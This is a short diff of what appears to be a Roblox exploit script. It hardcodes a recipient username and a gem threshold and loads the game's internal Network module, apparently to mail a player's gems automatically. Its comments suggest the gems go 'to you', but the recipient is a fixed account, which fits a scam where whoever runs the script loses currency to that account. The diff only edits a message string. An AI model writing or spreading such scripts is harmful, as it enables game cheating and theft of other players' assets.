@@ -1,6 +1,6 @@
 local UserToSendTo = "GenesisE_YT" -- Username To Send Gems To
 local GemsAmount = 10000 -- If Your Gems Go Over This Amount It Will Send Them To You
-local Message = "getgenv().Settings.["Mailbox"]["Recipient"]"
+local Message = "getgenv().Settings.Recipient"
 
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
 local Fire, Invoke = Network.Fire, Network.Invoke
